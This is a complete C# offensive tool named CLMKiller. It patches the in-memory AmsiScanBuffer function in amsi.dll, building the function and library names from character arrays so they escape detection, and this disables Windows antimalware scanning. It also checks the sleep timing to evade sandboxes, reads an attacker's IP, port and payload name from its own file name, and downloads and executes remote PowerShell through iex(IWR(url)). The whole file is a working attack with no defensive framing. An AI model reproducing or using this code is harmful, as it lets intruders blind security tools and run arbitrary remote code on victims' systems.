using System;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices.WindowsRuntime;

namespace CLMKiller
{
    public class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static int Patcher()
        {
            char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
            String funcName = string.Join("", chars);

            char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
            String libName = string.Join("", chars2);

            IntPtr Address = GetProcAddress(LoadLibrary(libName), funcName);

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);
            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(Patch, 0, Address, 6);

            return 0;

        }

        static int CompareTime(DateTime timeBefore)
        {
            double timeDiff = DateTime.Now.Subtract(timeBefore).TotalSeconds;
            if (timeDiff < 5)
            {
                return 1;
            }
            else
            {
                return 0;
            }
        }
        static void Kill(string url)
        {
            Runspace run = RunspaceFactory.CreateRunspace();

            run.Open();
            PowerShell shell = PowerShell.Create();
            shell.Runspace = run;

            String exec = $"iex(IWR('{url}'))";  // Modify for custom commands
            shell.AddScript(exec);
            shell.Invoke();

            Collection<PSObject> output = shell.Invoke();
            foreach (PSObject o in output)
            {
                Console.WriteLine(o.ToString());
            }

            foreach (ErrorRecord err in shell.Streams.Error)
            {
                Console.Write("Error: " + err.ToString());
            }
            run.Close();
        }
        public static void Main(string[] args)
        {
            Console.WriteLine("[*] Entering the nether");
            DateTime rightnow = DateTime.Now;
            Thread.Sleep(5000);
            
            if (CompareTime(rightnow) == 1)
            {
                return;
            }
            Console.WriteLine("[*] Passed the time Vortex");
            string assemblyPath = Process.GetCurrentProcess().MainModule.FileName;
            string assemblyFileName = Path.GetFileNameWithoutExtension(assemblyPath);
            string pattern = @"^(\d+)_(\d+)_(\d+)_(\d+)_(\d+)_(\w+)$";
            string result = "";

            Match match = Regex.Match(assemblyFileName, pattern);
            if (match.Success)
            {
                // Extract and print the integer and string parts
                string ipPartOctett1 = match.Groups[1].Value;
                string ipPartOctett2 = match.Groups[2].Value;
                string ipPartOctett3 = match.Groups[3].Value;
                string ipPartOctett4 = match.Groups[4].Value;
                string portPart = match.Groups[5].Value;
                string payloadPart = match.Groups[6].Value;

                if (portPart == "80")
                {
                    result = $"http://{ipPartOctett1.ToString()}.{ipPartOctett2.ToString()}.{ipPartOctett3.ToString()}.{ipPartOctett4.ToString()}/{payloadPart}";
                }
                else
                {
                    result = $"http://{ipPartOctett1.ToString()}.{ipPartOctett2.ToString()}.{ipPartOctett3.ToString()}.{ipPartOctett4.ToString()}:{portPart}/{payloadPart}";
                }
            }
            else
            {
                Console.WriteLine("[!] You are not part of our clan.");
                return;
            }

            Console.WriteLine("[*] About to kill it.");
            Console.WriteLine(Patcher());
            Kill(result);
            return;
        }
    }
}
